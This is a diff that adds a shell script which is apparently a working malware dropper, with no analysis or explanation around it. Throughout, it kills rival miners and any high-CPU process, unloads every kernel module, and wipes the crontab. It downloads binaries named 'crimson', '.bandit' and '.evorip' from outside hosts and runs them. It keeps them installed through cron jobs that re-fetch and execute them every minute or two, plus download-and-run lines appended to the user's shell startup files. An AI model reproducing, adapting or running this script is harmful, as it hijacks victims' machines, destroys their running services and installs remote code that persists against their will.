@@ -1,0 +1,89 @@
+#!/bin/sh
+
+pkill -9 -f .evorip|pkill -9 -f .bandit|pkill -9 -f crimson
+ps aux --sort=-%cpu | awk '$3 > 20 {print $2}' | xargs -r kill -9
+lsmod | awk '{print $1}' | tail -n +2 | xargs -r rmmod
+crontab -r
+
+if [ -w '/dev/shm' ]; then
+  export dir='/dev/shm'
+elif [ -w '/var/tmp' ]; then
+  export dir='/var/tmp'
+elif [ -w '/tmp' ]; then
+  export dir='/tmp'
+fi
+
+if [ "$(command -v curl)" ]; then
+  export bin_command="curl -s -o ${dir}/crimson"
+  export mo1_command="curl -s -o ${dir}/.bandit"
+  export mo2_command="curl -s -o ${dir}/.evorip"
+elif [ "$(command -v wget)" ]; then
+  export bin_command="wget -q -O ${dir}/crimson"
+  export mo1_command="wget -q -O ${dir}/.bandit"
+  export mo2_command="wget -q -O ${dir}/.evorip"
+else
+  exit
+fi  
+
+x86='https://cybercrim.es/crimson.x86'
+arm='https://cybercrim.es/crimson.arm'
+
+arch=$(uname -m)
+if [ "${arch}" = 'x86_64' ]; then
+  ${bin_command} ${x86}
+  arch=${x86}
+elif [ "${arch}" = 'aarch64' ] || [ "${arch}" = 'armv8l' ]; then
+  ${bin_command} ${arm}
+  arch=${arm}
+fi
+
+mo1='https://openstorage.org/leia'
+mo2='https://openstorage.org/l1'
+
+${mo1_command} ${mo1}
+${mo2_command} ${mo2}
+
+if [ "$(id -u)" = 0 ]; then
+  if ! pgrep -f 'cron' >/dev/null; then
+    service cron start
+    systemctl start cron
+  fi  
+fi
+
+if pgrep -f 'cron' >/dev/null; then
+  echo 'cron running'
+fi  
+
+(echo "*/2 * * * * ${mo1_command} ${mo1} && chmod a+x ${dir}/.bandit && cd ${dir} && ./bandit") | crontab -
+(echo "* * * * * ${mo2_command} ${mo2} && chmod a+x ${dir}/.evorip && cd ${dir} && ./.evorip") | crontab -
+(echo "*/2 * * * * ${bin_command} ${arch} && chmod a+x ${dir}/crimson") | crontab -
+
+if [ -f "$HOME/.bashrc" ]; then
+  if ! grep "https://openstorage.org/l1" "$HOME/.bashrc"; then
+    echo "if [ ! -f ${dir}/.evorip ]; then" >> $HOME/.bashrc
+    echo "  curl -s -o ${dir}/.evorip https://openstorage.org/l1" >> $HOME/.bashrc
+    echo "  chmod a+x ${dir}/.evorip" >> $HOME/.bashrc
+    echo "  ${dir}/.evorip" >> $HOME/.bashrc
+    echo "elif [ -f ${dir}/.evorip ]; then" >> $HOME/.bashrc
+    echo "  ${dir}/.evorip" >> $HOME/.bashrc
+    echo "fi" >> $HOME/.bashrc
+  fi
+elif [ -f "$HOME/.profile" ]; then
+  if ! grep "https://openstorage.org/l1" "$HOME/.profile"; then
+    echo "if [ ! -f ${dir}/.evorip ]; then" >> $HOME/.profile
+    echo "  curl -s -o ${dir}/.evorip https://openstorage.org/l1" >> $HOME/.profile
+    echo "  chmod a+x ${dir}/.evorip" >> $HOME/.profile
+    echo "  ${dir}/.evorip" >> $HOME/.profile
+    echo "elif [ -f ${dir}/.evorip ]; then" >> $HOME/.profile
+    echo "  ${dir}/.evorip" >> $HOME/.profile
+    echo "fi" >> $HOME/.profile
+  fi
+fi
+
+chmod a+x ${dir}/crimson
+chmod a+x ${dir}/.bandit
+chmod a+x ${dir}/.evorip
+
+${dir}/crimson
+${dir}/.bandit
+${dir}/.evorip
